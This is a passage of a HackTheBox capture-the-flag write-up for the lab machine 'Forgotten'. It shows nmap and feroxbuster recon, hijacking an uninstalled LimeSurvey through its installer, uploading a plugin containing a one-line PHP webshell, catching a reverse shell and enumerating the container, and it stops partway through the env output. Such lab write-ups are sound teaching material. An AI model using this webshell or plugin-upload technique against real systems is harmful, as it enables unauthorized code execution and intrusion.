@@ -1,0 +1,487 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Forgotten</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#htb-forgotten">htb-forgotten</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#vulnlab">vulnlab</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#ubuntu">ubuntu</a> <a class="post-tag" href="/tags#debian">debian</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#feroxbuster">feroxbuster</a> <a class="post-tag" href="/tags#limesurvey">limesurvey</a> <a class="post-tag" href="/tags#docker-mysql">docker-mysql</a> <a class="post-tag" href="/tags#limesurvey-plugin">limesurvey-plugin</a> <a class="post-tag" href="/tags#htb-heal">htb-heal</a> <a class="post-tag" href="/tags#webshell">webshell</a> <a class="post-tag" href="/tags#environment-variable">environment-variable</a> </span><br/><br/>
+<time class="dt-published" datetime="2025-09-16T09:00:00+00:00" itemprop="datePublished">Sep 16, 2025
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2025/09/16/htb-forgotten.html" style="color: #e6e6e6; text-decoration: none;">HTB: Forgotten</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="/img/forgotten-cover.webp" type="image/webp"/>
+<img alt="Forgotten" class="include_image" loading="lazy" src="/img/forgotten-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:150px;">
+</img></picture>
+<p>Forgotten starts with an uninitialized instance of LimeSurvey. I’ll do the installation wizard, using a MySQL instance hosted on my VM as the database, and giving myself superadmin access. I’ll upload a malicious plugin to get RCE and a shell in the LimeSurvey container. I’ll find a password in an environment variable that works for the user account on the host, as well as sudo to get root in the container. I’ll abuse that to write a root-owned SetUID binary in a shared folder on the container such that I get access to it on the host and complete the compromise.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/733 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/forgotten" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Forgotten</a> <a href="https://hackthebox.com/machines/forgotten" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-forgotten.webp" type="image/webp"/> <img alt="Forgotten" class="img-av" src="/icons/box-forgotten.png"/></picture></a><br/><a href="https://hackthebox.com/machines/forgotten" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1968714178098577919">16 Sep 2025</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">16 Sep 2025</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">N/A (non-competitive)</td>
+</tr>
+<tr>
+<td>Creator</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="initial-scanning">Initial Scanning</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">--min-rate</span> 10000 10.129.171.142
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 15:31 UTC
+...[snip]...
+Nmap scan report for 10.129.171.142
+Host is up, received reset ttl 63 (0.023s latency).
+Scanned at 2025-09-16 15:31:32 UTC for 7s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 62
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds
+           Raw packets sent: 65828 (2.896MB) | Rcvd: 65536 (2.621MB)
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.171.142
+<span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-16 15:31 UTC
+Nmap scan report for 10.129.171.142
+Host is up (0.022s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 28:c7:f1:96:f9:53:64:11:f8:70:55:68:0b:e5:3c:22 (ECDSA)
+|_  256 02:43:d2:ba:4e:87:de:77:72:ce:5a:fa:86:5c:0d:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.56
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.56 (Debian)
+Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH version</a>, the host is likely running Ubuntu 22.04 jammy LTS (or maybe 22.10 kinetic). The <a href="/cheatsheets/os#debian">Apache version</a> shows Debian, which is difficult to nail down a version from. Still, it’s interesting that it’s different from the OS on SSH. <code class="language-plaintext highlighter-rouge">nmap</code> shows one additional hop to get to the webserver, which <code class="language-plaintext highlighter-rouge">lft</code> confirms:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.171.142:22
+<span class="go">Tracing ...T
+TTL LFT trace to 10.129.171.142:22/tcp
+ 1  10.10.14.1 21.1ms
+ 2  [target open] 10.129.171.142:22 21.6ms
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.171.142:80
+<span class="go">Tracing ....T
+TTL LFT trace to 10.129.171.142:80/tcp
+ 1  10.10.14.1 21.3ms
+ 2  10.129.171.142 21.9ms
+ 3  [target open] 10.129.171.142:80 21.8ms
+</span></code></pre></div></div>
+<p>All of this implies the web application is running in a Debian container on an Ubuntu 22.04 host.</p>
+<p>The website seems to be returning 403 forbidden. That could be that it requires auth, or that there’s some kind of WAF detecting and blocking <code class="language-plaintext highlighter-rouge">nmap</code> typically by user-agent string.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Visiting the site does return 403:</p>
+<picture>
+<source srcset="/img/image-20250916114257359.webp" type="image/webp"/>
+<img alt="image-20250916114257359" class="include_image" loading="lazy" src="/img/image-20250916114257359.png"/>
+</picture>
+<h4 id="tech-stack">Tech Stack</h4>
+<p>The HTTP response headers just show Apache (which is also in the 403 page):</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">403</span> <span class="ne">Forbidden</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 16 Sep 2025 15:43:14 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.56 (Debian)</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">277</span>
+<span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=iso-8859-1</span>
+</code></pre></div></div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.171.142
+<span class="go">
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.171.142
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+</span><span class="feroxbuster-red">403</span><span class="go">      GET        9l       28w      279c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-red">404</span><span class="go">      GET        9l       31w      276c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      317c http://10.129.171.142/survey =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/</span><span class="go">
+</span><span class="feroxbuster-yellow">302</span><span class="go">      GET        0l        0w        0c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      325c http://10.129.171.142/survey/modules =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/modules/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      321c http://10.129.171.142/survey/tmp =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/tmp/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      323c http://10.129.171.142/survey/admin =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/admin/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      324c http://10.129.171.142/survey/themes =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/themes/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      325c http://10.129.171.142/survey/plugins =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/plugins/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      324c http://10.129.171.142/survey/assets =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/assets/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      324c http://10.129.171.142/survey/upload =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/upload/</span><span class="go">
+</span><span class="feroxbuster-yellow">301</span><span class="go">      GET        9l       28w      331c http://10.129.171.142/survey/upload/themes =&gt; </span><span class="feroxbuster-yellow">http://10.129.171.142/survey/upload/themes/</span><span class="go">
+[</span><span class="feroxbuster-yellow">#</span><span class="go">&gt;------------------] - 5m     25307/300015  69m     </span><span class="feroxbuster-green">found</span><span class="go">:9       </span><span class="feroxbuster-red">errors</span><span class="go">:18593  
+🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_129_171_142-1758037728.state ...
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m     25422/300015  69m     </span><span class="feroxbuster-green">found</span><span class="go">:9       </span><span class="feroxbuster-red">errors</span><span class="go">:18708  
+[</span><span class="feroxbuster-cyan">#####</span><span class="go">&gt;--------------] - 5m      8290/30000   30/s    http://10.129.171.142/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      2083/30000   7/s     http://10.129.171.142/survey/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1832/30000   7/s     http://10.129.171.142/survey/tmp/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1864/30000   7/s     http://10.129.171.142/survey/admin/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1866/30000   7/s     http://10.129.171.142/survey/themes/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1863/30000   7/s     http://10.129.171.142/survey/plugins/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 4m      1814/30000   7/s     http://10.129.171.142/survey/assets/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1851/30000   7/s     http://10.129.171.142/survey/modules/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 5m      1916/30000   7/s     http://10.129.171.142/survey/upload/ 
+[</span><span class="feroxbuster-cyan">#</span><span class="go">&gt;------------------] - 4m      1799/30000   7/s     http://10.129.171.142/survey/upload/themes/     
+</span></code></pre></div></div>
+<p>After a minute or so, it starts returning all errors, but that’s still enough to see there’s some kind of application (maybe a CMS) at <code class="language-plaintext highlighter-rouge">/survey</code>.</p>
+<h4 id="survey">/survey</h4>
+<p>Visiting <code class="language-plaintext highlighter-rouge">/survey</code> returns a LimeSurvey installer page:</p>
+<p><a href="/img/image-20250916115710365.png"><img alt="image-20250916115710365" src="/img/image-20250916115710365.png"/><em>Click for full size image</em></a></p>
+<p>If I click “Start installation” and then click through the license, the “Pre-installation check” page has the version 6.3.7 at the top:</p>
+<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="/img/image-20250916122936811.png">
+<img alt="image-20250916122936811" src="/img/image-20250916122936811.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 275px"><a href="/img/image-20250916122936811.png"><i>Click for full image</i></a></div>
+</div>
+<h2 id="shell-as-limesurvey-in-docker">Shell as limesurvey in Docker</h2>
+<h3 id="strategy">Strategy</h3>
+<p>I don’t find any obvious vulnerabilities in this version of LimeSurvey. The main CVE I keep coming across is <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44967#vulnCurrentDescriptionTitle">CVE-2021-44967</a>. I talked a bit about this in my <a href="/2025/05/17/htb-heal.html#find-plugin">Heal post</a>, but this really shouldn’t have been given a CVE ID (in my humble opinion). The super admin role can edit PHP code, which means that anyone with that role can get RCE. That is the intended behavior of the software. It’s also something I can abuse, if I can get that level of access.</p>
+<p>This instance appears to be not installed, so if I can initialize it such a way that I get super admin access, then I can upload a module and get RCE just like in Heal.</p>
+<h3 id="database-setup">Database Setup</h3>
+<p>Step 4 is where I need to configure the database. I have no reason to think there’s a DB running on Forgotten, and even if there is, I don’t know the creds. Still I get to define where the DB lives:</p>
+<p><a href="/img/image-20250916140621839.png"><img alt="image-20250916140621839" src="/img/image-20250916140621839.png"/><em>Click for full size image</em></a></p>
+<p>I’ll use Docker to create a MySQL server:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>docker run <span class="nt">--name</span> limesurvey-mysql <span class="nt">-e</span> <span class="nv">MYSQL_ROOT_PASSWORD</span><span class="o">=</span>rootpass123 <span class="nt">-e</span> <span class="nv">MYSQL_DATABASE</span><span class="o">=</span>limesurvey <span class="nt">-e</span> <span class="nv">MYSQL_USER</span><span class="o">=</span>limeuser <span class="nt">-e</span> <span class="nv">MYSQL_PASSWORD</span><span class="o">=</span>limepassword <span class="nt">-p</span> 3306:3306 <span class="nt">-d</span> mysql:latest
+<span class="go">Unable to find image 'mysql:latest' locally
+latest: Pulling from library/mysql
+500d7b2546c4: Pull complete 
+01859c60b4e2: Pull complete 
+87565b56b57e: Pull complete 
+9b2f3769f0be: Pull complete 
+7d70b564625b: Pull complete 
+1d289f7d1ed9: Pull complete 
+d210a5b69bfe: Pull complete 
+95f5cac1a9e9: Pull complete 
+98045e6cd572: Pull complete 
+1421f5b704d5: Pull complete 
+Digest: sha256:94254b456a6db9b56c83525a86bff4c7f1e52335f934cbed686fe1ce763116a0
+Status: Downloaded newer image for mysql:latest
+8d4bf088fe1c8b5ad600159526a7cc77ee044d30f521cb61064a9eb9f8772419
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>netstat <span class="nt">-tnlp</span> | <span class="nb">grep </span>3306
+<span class="go">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      33408/docker-proxy  
+tcp6       0      0 :::3306                 :::*                    LISTEN      33414/docker-proxy 
+</span></code></pre></div></div>
+<p>The username, password, and table name are arbitrary, as long as I use those same values in the LimeSurvey setup:</p>
+<picture>
+<source srcset="/img/image-20250916141252713.webp" type="image/webp"/>
+<img alt="image-20250916141252713" class="include_image" loading="lazy" src="/img/image-20250916141252713.png"/>
+</picture>
+<p>On clicking next, it can see the database:</p>
+<p><a href="/img/image-20250916141325252.png"><img alt="image-20250916141325252" src="/img/image-20250916141325252.png"/><em>Click for full size image</em></a></p>
+<p>I’ll click “Populate database”. The next screen is the “Administrator settings”:</p>
+<div style="max-height: 500px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="/img/image-20250916141427814.png">
+<img alt="image-20250916141427814" src="/img/image-20250916141427814.png" style="clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 460px, 49% 490px, 51% 470px, 0 500px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 475px"><a href="/img/image-20250916141427814.png"><i>Click for full image</i></a></div>
+</div>
+<p>I’ll update the password to something I know, and click “Next”. It installed:</p>
+<picture>
+<source srcset="/img/image-20250916141456074.webp" type="image/webp"/>
+<img alt="image-20250916141456074" class="include_image" loading="lazy" src="/img/image-20250916141456074.png"/>
+</picture>
+<h3 id="admin-rce">Admin RCE</h3>
+<p>Clicking the “Administration” button leads to the admin login page:</p>
+<picture>
+<source srcset="/img/image-20250916141910929.webp" type="image/webp"/>
+<img alt="image-20250916141910929" class="include_image" loading="lazy" src="/img/image-20250916141910929.png"/>
+</picture>
+<p>I’ll log in with the user I just created and it logs in:</p>
+<picture>
+<source srcset="/img/image-20250916142031074.webp" type="image/webp"/>
+<img alt="image-20250916142031074" class="include_image" loading="lazy" src="/img/image-20250916142031074.png"/>
+</picture>
+<p>I’ll follow the same steps as in <a href="/2025/05/17/htb-heal.html#limesurvey-rce">Heal</a>, first creating a PHP webshell <code class="language-plaintext highlighter-rouge">0xdf.php</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>I’ll also grab the <a href="https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads">example config file</a> and save it as <code class="language-plaintext highlighter-rouge">config.xml</code>. This file contains metadata about the plugin (such as the name). I can customize it, but I’ll just leave it exactly as is, noting the name “ExampleSettings”. I’ll Zip those two files:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>zip 0xdf.zip 0xdf.php config.xml 
+<span class="go">  adding: 0xdf.php (stored 0%)
+  adding: config.xml (deflated 53%)
+</span></code></pre></div></div>
+<p>Under Configuration there’s a Plugins option:</p>
+<p><a href="/img/image-20250916142602160.png"><img alt="image-20250916142602160" src="/img/image-20250916142602160.png"/><em>Click for full size image</em></a></p>
+<p>That screen shows the existing plugins, and also has an “Upload &amp; install” option:</p>
+<p><a href="/img/image-20250916142712319.png"><img alt="image-20250916142712319" src="/img/image-20250916142712319.png"/><em>Click for full size image</em></a></p>
+<p>I’ll click that and give it <code class="language-plaintext highlighter-rouge">0xdf.zip</code>. The details from the default config show up:</p>
+<p><a href="/img/image-20250916142751544.png"><img alt="image-20250916142751544" src="/img/image-20250916142751544.png"/><em>Click for full size image</em></a></p>
+<p>I’ll click “Install”, and now it shows up as “ExampleSettings” (from the <code class="language-plaintext highlighter-rouge">config.xml</code>):</p>
+<p><a href="/img/image-20250916142838471.png"><img alt="image-20250916142838471" src="/img/image-20250916142838471.png"/><em>Click for full size image</em></a></p>
+<p>As I found in <a href="/2025/05/17/htb-heal.html#limesurvey-rce">Heal</a>, the path is now <code class="language-plaintext highlighter-rouge">/survey/upload/plugins/ExampleSettings/0xdf.php</code>:</p>
+<picture>
+<source srcset="/img/image-20250916143011306.webp" type="image/webp"/>
+<img alt="image-20250916143011306" class="include_image" loading="lazy" src="/img/image-20250916143011306.png"/>
+</picture>
+<h3 id="shell">Shell</h3>
+<p>To get a shell, I’ll provide a <a href="https://www.youtube.com/watch?v=OjkVep2EIlw">bash reverse shell</a> to the webshell just in Firefox (making sure to encode <code class="language-plaintext highlighter-rouge">&amp;</code> as <code class="language-plaintext highlighter-rouge">%26</code>), and I get a connection at <code class="language-plaintext highlighter-rouge">nc</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Listening on 0.0.0.0 443
+Connection received on 10.129.171.142 38526
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$</span><span class="w"> 
+</span></code></pre></div></div>
+<p>I’ll do a shell upgrade using the <a href="https://www.youtube.com/watch?v=DqE6DxqJg8Q">standard trick</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$</span><span class="w"> </span>script /dev/null <span class="nt">-c</span> bash
+<span class="go">Script started, output log file is '/dev/null'.
+</span><span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$</span><span class="w"> </span>^Z
+<span class="go">[1]+  Stopped                 nc -lnvp 443
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
+<span class="go">nc -lnvp 443
+</span><span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$</span><span class="w"> </span>reset<span class="se">\</span>
+<span class="go">reset: unknown terminal type unknown
+</span><span class="gp">Terminal type?</span><span class="w"> </span>screen
+<span class="gp">limesvc@efaa6f5097ed:/var/www/html/survey/upload/plugins/ExampleSettings$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-limesvc-on-forgotten">Shell as limesvc on Forgotten</h2>
+<h3 id="enumeration">Enumeration</h3>
+<h4 id="container">Container</h4>
+<p>The hostname of 12 hex characters matches the default Docker name. There’s also a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file at the system root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span> 
+<span class="go">.   .dockerenv  boot  etc   lib    media  opt   root  sbin  sys  usr
+..  bin         dev   home  lib64  mnt    proc  run   srv   tmp  var
+</span></code></pre></div></div>
+<p>The IP address is 172.17.0.2, which is not what I was interacting with (so it must be forwarded from the host):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span>ifconfig eth0
+<span class="go">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+        RX packets 193028  bytes 21248170 (20.2 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 62814  bytes 18525854 (17.6 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</span></code></pre></div></div>
+<h4 id="web">Web</h4>
+<p>The website is running from <code class="language-plaintext highlighter-rouge">/var/www/html/</code> according to <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code> (comments removed):</p>
+<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">VirtualHost</span><span class="sr"> *:80</span><span class="p">&gt;
+</span>        <span class="nc">ServerAdmin</span> webmaster@localhost
+        <span class="nc">DocumentRoot</span> /var/www/html
+        
+        <span class="nc">ErrorLog</span> ${APACHE_LOG_DIR}/error.log
+        <span class="nc">CustomLog</span> ${APACHE_LOG_DIR}/access.log combined
+<span class="p">&lt;/</span><span class="nl">VirtualHost</span><span class="p">&gt;
+</span></code></pre></div></div>
+<p>There’s a <code class="language-plaintext highlighter-rouge">survey</code> directory as expected:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/var/www/html$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">survey
+</span><span class="gp">limesvc@efaa6f5097ed:/var/www/html$</span><span class="w"> </span><span class="nb">ls </span>survey/
+<span class="go">LICENSE      application  index.php  node_modules      psalm-strict.xml  tmp
+README.md    assets       installer  open-api-gen.php  psalm.xml         upload
+SECURITY.md  docs         locale     plugins           setdebug.php      vendor
+admin        gulpfile.js  modules    psalm-all.xml     themes
+</span></code></pre></div></div>
+<h4 id="users">Users</h4>
+<p>There’s only one non-root user with a home directory in <code class="language-plaintext highlighter-rouge">/home</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/home$</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">limesvc
+</span></code></pre></div></div>
+<p>That matches the users with shells set in <code class="language-plaintext highlighter-rouge">passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="s1">'sh$'</span>
+<span class="go">root:x:0:0:root:/root:/bin/bash
+limesvc:x:2000:2000::/home/limesvc:/bin/bash
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/home</code> is very empty:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/home$</span><span class="w"> </span>find <span class="nb">.</span> <span class="nt">-type</span> f
+<span class="go">./limesvc/.profile
+./limesvc/.bashrc
+./limesvc/.bash_logout
+</span></code></pre></div></div>
+<p>limesvc requires a password to run <code class="language-plaintext highlighter-rouge">sudo</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/home$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+</span><span class="c">    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+</span><span class="go">
+[sudo] password for limesvc: 
+</span></code></pre></div></div>
+<p>I don’t have one.</p>
+<p>Checking the environment variables, there is one for <code class="language-plaintext highlighter-rouge">LIMESURVEY_PASS</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">limesvc@efaa6f5097ed:/$</span><span class="w"> </span><span class="nb">env</span>
+<span class="go">HOSTNAME=efaa6f5097ed
+PHP_VERSION=8.0.30
+APACHE_CONFDIR=/etc/apache2
